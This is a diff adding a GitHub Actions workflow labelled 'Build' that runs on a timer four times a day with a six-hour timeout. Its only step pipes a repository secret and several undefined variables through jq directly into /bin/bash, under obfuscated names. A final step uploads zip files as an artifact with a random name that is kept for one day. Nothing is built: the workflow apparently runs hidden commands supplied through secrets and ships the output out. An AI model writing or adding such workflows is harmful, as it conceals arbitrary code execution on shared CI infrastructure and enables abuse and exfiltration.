@@ -1,0 +1,35 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '42 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          ufw72: ${{ secrets.ufw72 }}
+        run: |
+          printf '%s' "$ufw72" | jq -r .ev1310 | /bin/bash
+          echo $g4168 | jq -r .flstm1 | /bin/bash
+          printf '%s' "$ht34638" | jq -r .wtdai0776 | /bin/bash
+          printf '%s' "$py67" | jq -r .z03710 | /bin/bash
+          printf '%s' "$x60" | jq -r .to285 | /bin/bash
+          printf '%s' "$o446" | jq -r .rq492 | /bin/bash
+          echo $jrqlg7991 | jq -r .gqtl16 | /bin/bash
+          printf '%s' "$om8359" | jq -r .j66 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: WzkzUfDz
+          path: "*.zip"
+          retention-days: 1
